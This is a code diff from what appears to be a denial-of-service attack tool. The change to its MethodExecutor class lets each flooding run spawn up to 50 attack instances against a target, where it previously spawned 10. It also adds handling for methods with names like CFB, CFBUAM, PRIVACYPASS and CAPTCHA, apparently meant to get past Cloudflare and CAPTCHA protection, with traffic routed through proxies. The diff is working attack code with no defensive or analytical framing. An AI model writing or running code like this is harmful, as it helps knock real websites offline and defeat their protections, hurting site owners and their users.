@@ -114,12 +114,24 @@ export class MethodExecutor {
             logger.info(`🔥 Executing ${methodUpper} attack on ${target}`);
             logger.info(`   Threads: ${threads}, Duration: ${duration}s, RPC: ${rpc}`);
 
-            // Create attack instances - use limited number to prevent OOM
-            const numInstances = Math.min(threads, 10); // Max 10 instances
+            // Create attack instances - scale with threads but cap to prevent OOM
+            const numInstances = Math.min(Math.max(Math.floor(threads / 10), 5), 50); // Min 5, Max 50 instances
             const attacks = [];
             
+            logger.info(`   Creating ${numInstances} attack instances (threads: ${threads})`);
+            
+            // Check which constructor signature to use
+            const isBypassMethod = ['CFB', 'CFBUAM', 'BYPASS', 'PRIVACYPASS', 'CAPTCHA', 'ULTIMATE'].includes(methodUpper);
+            
             for (let i = 0; i < numInstances; i++) {
-                const attack = new MethodClass(target, duration, rpc, userAgents, referers, proxies);
+                let attack;
+                if (isBypassMethod) {
+                    // Bypass methods: (targetUrl, duration, rpc, proxies)
+                    attack = new MethodClass(target, duration, rpc, proxies);
+                } else {
+                    // Standard methods: (targetUrl, duration, rpc, userAgents, referers, proxies)
+                    attack = new MethodClass(target, duration, rpc, userAgents, referers, proxies);
+                }
                 attacks.push(attack);
             }
             
